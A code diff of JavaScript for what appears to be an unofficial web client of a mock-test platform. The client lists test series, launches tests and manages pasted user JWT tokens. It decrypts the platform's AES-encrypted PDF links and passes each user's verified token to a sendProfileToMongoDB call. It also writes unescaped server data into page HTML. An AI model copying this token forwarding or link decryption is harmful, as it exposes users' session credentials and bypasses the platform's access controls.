+    state.totalSeriesCount = totalSeries; state.totalTestsCount = totalTestsSum; window.updateDashboardUI();
 }
 
-// =====================================================
-// STEP 2: SHOW FOLDERS (SUBJECTS) WITH DASHBOARD HIDDEN
-// =====================================================
 async function openTestSeriesSubjects(tsId, tsTitle) {
-    state.activeSeriesId = tsId;
-    state.activeSeriesTitle = tsTitle;
-    state.view = "ts_subjects";
-    switchAppTab("tests");
-    updateBackNavButton();
-
-    document.getElementById("crumbText").textContent = `Test Series #${tsId}`;
-    document.getElementById("headingText").textContent = tsTitle;
-    window.scrollTo({ top: 0, behavior: "smooth" });
-
-    const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Checking Test Series Folders...</div>`;
+    state.activeSeriesId = tsId; state.activeSeriesTitle = tsTitle; state.view = "ts_subjects"; switchAppTab("tests"); updateBackNavButton();
+    document.getElementById("crumbText").textContent = `Test Series #${tsId}`; document.getElementById("headingText").textContent = tsTitle; window.scrollTo({ top: 0, behavior: "smooth" });
+    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Checking Test Series Folders...</div>`;
 
     const useTok = state.activeTokenObj || USER_TOKENS[0] || null;
     fetchRawJSONWithToken(`/Test_Series/test_series_by_id?id=${tsId}`, useTok);
     const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);
 
-    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
-        openTestSeriesTitles(tsId, "-1", tsTitle);
-        return;
-    }
+    if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) { openTestSeriesTitles(tsId, "-1", tsTitle); return; }
 
     grid.innerHTML = "";
     subs.forEach(s => {
@@ -1352,82 +1166,66 @@ async function openTestSeriesSubjects(tsId, tsTitle) {
         grid.innerHTML += `
             <div onclick="openTestSeriesTitles('${tsId}', '${s.subjectid}', '${sname}')" class="grid-card p-4 flex items-center gap-4 cursor-pointer">
                 <img src="${logo}" onerror="this.src='https://placehold.co/80x80/4f46e5/ffffff?text=FOLDER'" class="w-16 h-16 rounded-2xl object-cover shadow-md">
-                <div class="flex-1">
-                    <span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">FOLDER #${s.subjectid}</span>
-                    <h4 class="font-black text-base text-slate-900 mt-1">📂 ${s.subject_name}</h4>
-                    <p class="text-xs text-blue-600 font-extrabold mt-1">Open Folder Tests ➔</p>
-                </div>
+                <div class="flex-1"><span class="px-2 py-0.5 rounded bg-indigo-100 text-indigo-900 text-[10px] font-black">FOLDER #${s.subjectid}</span><h4 class="font-black text-base text-slate-900 mt-1">📂 ${s.subject_name}</h4><p class="text-xs text-blue-600 font-extrabold mt-1">Open Folder Tests ➔</p></div>
             </div>`;
     });
 }
 
-// =====================================================
-// STEP 3: SHOW TESTS INSIDE SERIES / FOLDER (WITH SCORECARD BUTTON)
-// =====================================================
 async function openTestSeriesTitles(tsId, subId, subName) {
-    state.view = "ts_tests";
-    state.activeSeriesId = tsId;
-    state.activeTsSubId = String(subId);
-    state.activeTsSubName = subName;
-    switchAppTab("tests");
-    updateBackNavButton();
-
-    document.getElementById("crumbText").textContent = state.activeSeriesTitle;
-    document.getElementById("headingText").textContent = `📝 ${subName}`;
-    window.scrollTo({ top: 0, behavior: "smooth" });
-
-    const grid = document.getElementById("mainGrid");
-    grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Mock Tests...</div>`;
+    state.view = "ts_tests"; state.activeSeriesId = tsId; state.activeTsSubId = String(subId); state.activeTsSubName = subName; switchAppTab("tests"); updateBackNavButton();
+    document.getElementById("crumbText").textContent = state.activeSeriesTitle; document.getElementById("headingText").textContent = `📝 ${subName}`; window.scrollTo({ top: 0, behavior: "smooth" });
+    const grid = document.getElementById("mainGrid"); grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">🔄 Fetching Mock Tests...</div>`;
 
     const useTok = state.activeTokenObj || USER_TOKENS[0] || null;
     const uid = (useTok && useTok.userId) || (useTok && extractUidFromJwt(useTok.token)) || "4756316";
-    const ep = String(subId) === "-1"
-        ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
-        : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
+    const ep = String(subId) === "-1" ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1` : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
 
     let list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || []);
     if ((!list || list.length === 0) && String(subId) !== "-1") {
         const epAlt = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
         list = await fetchAPIWithToken(epAlt, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["708_-1"] || []);
-    } else if (!list || list.length === 0) {
-        list = DB.tsTitles[`${tsId}_-1`] || DB.tsTitles["708_-1"] || [];
-    }
+    } else if (!list || list.length === 0) list = DB.tsTitles[`${tsId}_-1`] || DB.tsTitles["708_-1"] || [];
     renderTestTitlesGrid(list, tsId, useTok);
+}
+
+function decryptAppX(encStr) {
+    if (!encStr || typeof encStr !== "string") return "";
+    if (encStr.startsWith("http")) return encStr.trim();
+    if (!encStr.includes(":")) return encStr.trim();
+    try {
+        const [cipherB64, ivB64] = encStr.split(":");
+        const cipherParams = CryptoJS.lib.CipherParams.create({ ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/")) });
+        const iv = CryptoJS.enc.Base64.parse(ivB64);
+        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
+    } catch { return ""; }
+}
+
+function resolvePdfUrl(encPdf, signedPdf) {
+    const dec = decryptAppX(encPdf);
+    if (dec && dec.startsWith("http")) return dec;
+    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
+    if (signedPdf && signedPdf.includes("URLPrefix=")) {
+        try { const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0]; const decoded = atob(decodeURIComponent(b64)); if (decoded.startsWith("http")) return decoded; } catch {}
+    }
+    return signedPdf || dec || "";
 }
 
 function formatCardTimeLabel(rawTime) {
     const str = String(rawTime || "60").trim();
-    if (str.includes("+")) {
-        const parts = str.split("+").map(n => parseInt(n.trim()) || 0);
-        const sum = parts.reduce((a, b) => a + b, 0);
-        return `${sum} Mins (Sec)`;
-    }
+    if (str.includes("+")) return `${str.split("+").map(n => parseInt(n.trim()) || 0).reduce((a, b) => a + b, 0)} Mins (Sec)`;
     return `${str} Mins`;
 }
 
 function renderTestTitlesGrid(list, tsId, boundTok) {
-    const grid = document.getElementById("mainGrid");
-    const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0] || null;
-
-    if (!list || !list.length) {
-        grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi test uplabdh nahi hai.</div>`;
-        return;
-    }
+    const grid = document.getElementById("mainGrid"); const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0] || null;
+    if (!list || !list.length) { grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi test uplabdh nahi hai.</div>`; return; }
 
     grid.innerHTML = "";
     list.forEach((t, idx) => {
-        const rawId = String(t.id || `${tsId}_${idx}`);
-        state.knownTestIds[rawId] = true;
-
-        const tKey = `test_${rawId}`;
-        const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf || t.pdf_summary_link, t.pdf_url);
-        state.testMap[tKey] = {
-            ...t,
-            id: rawId,
-            seriesId: tsId || t.test_series_id,
-            resolvedPdf: pdfUrl,
-            tokenObj: testTok
-        };
+        const rawId = String(t.id || `${tsId}_${idx}`); state.knownTestIds[rawId] = true;
+        const tKey = `test_${rawId}`; const pdfUrl = resolvePdfUrl(t.pdf_url || t.test_solutions_pdf || t.pdf_summary_link, t.pdf_url);
+        state.testMap[tKey] = { ...t, id: rawId, seriesId: tsId || t.test_series_id, resolvedPdf: pdfUrl, tokenObj: testTok };
 
         const timeLabel = formatCardTimeLabel(t.time);
         const isSectional = String(t.time || "").includes("+") || String(t.restrict_part_switching) === "1";
@@ -1436,219 +1234,98 @@ function renderTestTitlesGrid(list, tsId, boundTok) {
 
         grid.innerHTML += `
             <div class="grid-card p-5 flex flex-col justify-between ${attemptRecord ? 'border-emerald-300 bg-emerald-50/20' : ''}">
-                <div>
-                    <div class="flex justify-between items-center gap-2 flex-wrap">
-                        <span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${rawId}</span>
-                        <div class="flex items-center gap-1.5">
-                            ${attemptRecord ? `<span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">✅ Score: ${attemptRecord.score}/${attemptRecord.maxMarks}</span>` : ""}
-                            <span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${timeLabel}</span>
-                        </div>
-                    </div>
-                    <h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
-                    <div class="flex gap-2.5 mt-2 text-xs font-bold text-slate-600 flex-wrap">
-                        <span>❓ ${t.questions || 50} Qs</span>
-                        <span>🏆 ${t.marks || 100} Marks</span>
-                        ${isSectional ? `<span class="text-rose-600">🔒 Sectional</span>` : ""}
-                        ${hasOptional ? `<span class="text-amber-700">📝 Optional Sub</span>` : ""}
-                    </div>
+                <div><div class="flex justify-between items-center gap-2 flex-wrap"><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">TEST #${rawId}</span>
+                        <div class="flex items-center gap-1.5">${attemptRecord ? `<span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">✅ Score: ${attemptRecord.score}/${attemptRecord.maxMarks}</span>` : ""}<span class="text-[11px] font-extrabold text-emerald-700">⏱️ ${timeLabel}</span></div>
+                    </div><h4 class="font-black text-base text-slate-900 mt-2">${t.title}</h4>
+                    <div class="flex gap-2.5 mt-2 text-xs font-bold text-slate-600 flex-wrap"><span>❓ ${t.questions || 50} Qs</span><span>🏆 ${t.marks || 100} Marks</span>${isSectional ? `<span class="text-rose-600">🔒 Sectional</span>` : ""}${hasOptional ? `<span class="text-amber-700">📝 Optional Sub</span>` : ""}</div>
                 </div>
                 <div class="flex flex-wrap gap-2 mt-4 pt-3 border-t border-sky-100">
                     <button onclick="launchCbtTest('${tKey}')" class="btn-watch flex-1 text-xs">${attemptRecord ? '🔄 Re-Attempt' : '🚀 Start Test'}</button>
-                    ${attemptRecord ? `<button onclick="openSavedTestScorecard('${rawId}', '${tKey}')" class="btn-nav bg-emerald-600 text-white border-0 flex-1 text-xs">📊 Scorecard</button>` : ""}
+                    ${attemptRecord ? `<button onclick='openSavedTestScorecard("${rawId}", "${tKey}", ${JSON.stringify({score: attemptRecord.score, maxMarks: attemptRecord.maxMarks, correct: attemptRecord.correct, incorrect: attemptRecord.incorrect, unattempted: attemptRecord.unattempted, accuracy: attemptRecord.accuracy, timeCorr: attemptRecord.timeCorr, timeInc: attemptRecord.timeInc, timeUna: attemptRecord.timeUna}).replace(/"/g, "&quot;")})' class="btn-nav bg-emerald-600 text-white border-0 flex-1 text-xs">📊 Scorecard</button>` : ""}
                     ${pdfUrl ? `<button onclick="openTestPdf('${tKey}')" class="btn-pdf1 text-xs">📄 Test PDF</button>` : ""}
                 </div>
             </div>`;
     });
-
     window.updateDashboardUI();
 }
 
-// =====================================================
-// STEP 4: REQUIRE LOGIN WHEN USER CLICKS START TEST
-// =====================================================
-window.launchCbtTest = async function(tKey) {
-    try {
-        const key = String(tKey || "").trim();
-        if (!key || !state.testMap[key]) {
-            throw new Error("Test details app में नहीं मिले। Test list को दोबारा खोलें।");
-        }
-
-        if (!isUserLoggedIn()) {
-            state.pendingTestKey = key;
-            openLoginModal("🔐 Test start karne ke liye pehle apna RWA Account Login karein!");
-            return;
-        }
-
-        state.testMap[key].tokenObj = USER_TOKENS[0] || null;
-
-        if (typeof window.launchTcsCbtEngine !== "function") {
-            throw new Error("TCS Engine load नहीं हुआ। index.html में tcs-engine.js का path और script tag जाँचें।");
-        }
-
-        await window.launchTcsCbtEngine(key);
-    } catch (error) {
-        console.error("RWA test launch error:", error);
-        const message = error && error.message ? error.message : String(error);
-        alert("Test शुरू नहीं हो पाया:\\n" + message);
-    }
-};
+async function launchCbtTest(tKey) {
+    if (!isUserLoggedIn()) { state.pendingTestKey = tKey; openLoginModal("🔐 Test start karne ke liye pehle apna RWA Account Login karein!"); return; }
+    if (state.testMap[tKey]) state.testMap[tKey].tokenObj = USER_TOKENS[0];
+    if (typeof window.launchTcsCbtEngine === "function") await window.launchTcsCbtEngine(tKey);
+}
 
 function openTestPdf(tKey) {
-    if (!isUserLoggedIn()) {
-        state.pendingPdfKey = tKey;
-        openLoginModal("🔐 Test PDF dekhne ke liye pehle Login karein!");
-        return;
-    }
-
-    const t = state.testMap[tKey];
-    if (!t || !t.resolvedPdf) return;
-    state.currentPdfUrl = t.resolvedPdf;
-    document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
-    
+    if (!isUserLoggedIn()) { state.pendingPdfKey = tKey; openLoginModal("🔐 Test PDF dekhne ke liye pehle Login karein!"); return; }
+    const t = state.testMap[tKey]; if (!t || !t.resolvedPdf) return;
+    state.currentPdfUrl = t.resolvedPdf; document.getElementById("pdfTitle").textContent = `📄 ${t.title} (Paper PDF)`;
     const rawPdfLink = document.getElementById("rawPdfLink");
-    rawPdfLink.href = "javascript:void(0)";
-    rawPdfLink.onclick = () => window.downloadAndUploadPDF(t.resolvedPdf, t.title);
-
-    showSlide("slidePdf");
-    setPdfMode("appx");
+    rawPdfLink.href = "javascript:void(0)"; rawPdfLink.onclick = () => window.downloadAndUploadPDF(t.resolvedPdf, t.title);
+    showSlide("slidePdf"); setPdfMode("appx");
 }
 
-function reAttemptCbtTest() {
-    if (typeof window.reAttemptTcsTest === "function") {
-        window.reAttemptTcsTest();
-    }
-}
-
-function exitCbtTest() {
-    if (typeof window.exitTcsTest === "function") {
-        window.exitTcsTest();
-    } else {
-        showSlide("slideExplorer");
-    }
-    window.updateDashboardUI();
-    if (state.view === "ts_tests" && state.activeSeriesId) {
-        openTestSeriesTitles(state.activeSeriesId, state.activeTsSubId || "-1", state.activeTsSubName || state.activeSeriesTitle);
-    }
-}
-
-// =====================================================
-// PDF SLIDE VIEWER
-// =====================================================
 function setPdfMode(mode) {
-    const frame = document.getElementById("pdfFrame");
-    const u = state.currentPdfUrl;
-    if (!u) return;
-    if (mode === "appx") {
-        frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
-    } else {
-        frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
-    }
+    const frame = document.getElementById("pdfFrame"), u = state.currentPdfUrl; if (!u) return;
+    frame.src = mode === "appx" ? `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0` : `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
 }
-
-function closePdfSlide() {
-    document.getElementById("pdfFrame").src = "";
-    showSlide(state.previousSlide || "slideExplorer");
-}
+function closePdfSlide() { document.getElementById("pdfFrame").src = ""; showSlide(state.previousSlide || "slideExplorer"); }
 
 // =====================================================
-// USER PERSONAL TOKEN MANAGER (INSIDE PROFILE MODAL)
+// TOKEN MANAGER LIST
 // =====================================================
 function renderTokenManagerList() {
-    const container = document.getElementById("tokenListContainer");
-    if (!container) return;
+    const container = document.getElementById("tokenListContainer"); if (!container) return;
     container.innerHTML = "";
-
-    if (USER_TOKENS.length === 0) {
-        container.innerHTML = `<div class="p-3 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`;
-        return;
-    }
+    if (USER_TOKENS.length === 0) { container.innerHTML = `<div class="p-3 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`; return; }
 
     USER_TOKENS.forEach((t, idx) => {
         const shortTok = t.token.slice(0, 26) + "..." + t.token.slice(-10);
         container.innerHTML += `
             <div class="bg-slate-50 border border-sky-200 rounded-xl p-3 flex flex-wrap justify-between items-center gap-2">
-                <div class="min-w-0 flex-1">
-                    <div class="flex items-center gap-1.5">
-                        <span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">TOKEN #${idx + 1}</span>
-                        <h5 class="font-extrabold text-xs text-slate-900 truncate">${t.label}</h5>
-                    </div>
-                    <p class="text-[10px] font-mono text-slate-500 mt-0.5 truncate">${shortTok}</p>
-                </div>
-                <div class="flex items-center gap-1.5">
-                    <button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-sky-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy</button>
-                    ${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="px-2.5 py-1 rounded-lg bg-rose-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">🗑</button>` : `<span class="text-[10px] font-bold text-emerald-600">● Active</span>`}
-                </div>
+                <div class="min-w-0 flex-1"><div class="flex items-center gap-1.5"><span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">TOKEN #${idx + 1}</span><h5 class="font-extrabold text-xs text-slate-900 truncate">${t.label}</h5></div><p class="text-[10px] font-mono text-slate-500 mt-0.5 truncate">${shortTok}</p></div>
+                <div class="flex items-center gap-1.5"><button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-sky-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy</button>${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="px-2.5 py-1 rounded-lg bg-rose-600 text-white font-extrabold text-[10px] border-0 cursor-pointer">🗑</button>` : `<span class="text-[10px] font-bold text-emerald-600">● Active</span>`}</div>
             </div>`;
     });
     updateTokenBadge();
 }
 
 async function addNewToken() {
-    const labelInput = document.getElementById("newTokLabel").value.trim();
-    const uidInput = document.getElementById("newTokUid").value.trim();
+    const labelInput = document.getElementById("newTokLabel").value.trim(), uidInput = document.getElementById("newTokUid").value.trim();
     let token = document.getElementById("newTokValue").value.trim();
-
-    if (!token) {
-        alert("Kripya JWT Token paste karein.");
-        return;
-    }
+    if (!token) { alert("Kripya JWT Token paste karein."); return; }
     token = token.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();
 
     const userId = uidInput || extractUidFromJwt(token);
-    if (!userId) {
-        alert("Invalid JWT Token format!");
-        return;
-    }
+    if (!userId) { alert("Invalid JWT Token format!"); return; }
 
     const verifiedUser = await fetchUserDetailsFromServer(token, userId);
-    if (!verifiedUser) {
-        alert("Server verification failed! Yeh token expired ya invalid hai.");
-        return;
-    }
+    if (!verifiedUser) { alert("Server verification failed! Yeh token expired ya invalid hai."); return; }
 
-    const newTokObj = {
-        id: "utok_" + Date.now(),
-        label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`,
-        userId: String(verifiedUser.userid || verifiedUser.id || userId),
-        token: token,
-        isAdmin: false
-    };
-
+    const newTokObj = { id: "utok_" + Date.now(), label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`, userId: String(verifiedUser.userid || verifiedUser.id || userId), token: token, isAdmin: false };
     USER_TOKENS = [newTokObj, ...USER_TOKENS.filter(t => t.userId !== newTokObj.userId)];
     USER_PROFILE = verifiedUser;
     localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
-    idbSetItem("rwa_user_tokens_v2", USER_TOKENS);
-    idbSetItem("rwa_user_profile_v2", USER_PROFILE);
+    idbSetItem("rwa_user_tokens_v2", USER_TOKENS); idbSetItem("rwa_user_profile_v2", USER_PROFILE);
 
     sendProfileToMongoDB(verifiedUser, token, "Added via Profile Token Manager", "N/A");
-
-    document.getElementById("newTokLabel").value = "";
-    document.getElementById("newTokUid").value = "";
-    document.getElementById("newTokValue").value = "";
-    updateTokenBadge();
-    openProfileModal();
-    alert(`✅ Token Verified & Saved for ${verifiedUser.name || "User"}!`);
+    document.getElementById("newTokLabel").value = ""; document.getElementById("newTokUid").value = ""; document.getElementById("newTokValue").value = "";
+    updateTokenBadge(); openProfileModal(); alert(`✅ Token Verified & Saved for ${verifiedUser.name || "User"}!`);
 }
 
 function deleteToken(id) {
     if (USER_TOKENS.length <= 1) return;
     USER_TOKENS = USER_TOKENS.filter(t => t.id !== id);
-    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
-    idbSetItem("rwa_user_tokens_v2", USER_TOKENS);
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); idbSetItem("rwa_user_tokens_v2", USER_TOKENS);
     renderTokenManagerList();
 }
 
 function filterGrid() {
     const q = document.getElementById("searchBox").value.toLowerCase();
-    document.querySelectorAll("#mainGrid .grid-card").forEach(el => {
-        el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none";
-    });
+    document.querySelectorAll("#mainGrid .grid-card").forEach(el => { el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none"; });
 }
 
-// =====================================================
-// INITIALIZATION ON PAGE LOAD
-// =====================================================
+// INIT
 updateTokenBadge();
 window.updateDashboardUI();
 restoreFromPermanentIDB();
